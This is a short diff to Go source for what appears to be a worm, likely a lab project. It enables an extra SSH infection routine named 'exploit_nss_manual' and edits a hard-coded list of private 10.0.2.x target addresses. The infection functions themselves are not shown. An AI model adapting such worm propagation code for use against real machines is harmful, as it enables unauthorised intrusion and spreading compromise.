@@ -47,7 +47,7 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 			}
 			message := infection.SshInfect(ip_port, "worm")
 			//We don't transfer the users and passwords because we are using the constants
-			//message = infection.SshInfect(ip_port, "exploit_nss_manual")
+			message = infection.SshInfect(ip_port, "exploit_nss_manual")
 			message = infection.SshExploit(ip_port)
 			fmt.Println(message)
 			infected = true
@@ -66,10 +66,10 @@ func main() {
 	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
 	var ipList [6]string
 
-	ipList[0] = "localhost"
+	ipList[0] = "10.0.2.14"
 	ipList[1] = "10.0.2.12"
 	ipList[2] = "10.0.2.13"
-	ipList[3] = "10.0.2.14"
+	ipList[3] = "10.0.2.15"
 	ipList[4] = "10.0.2.11"
 	ipList[5] = "10.0.2.8"
 
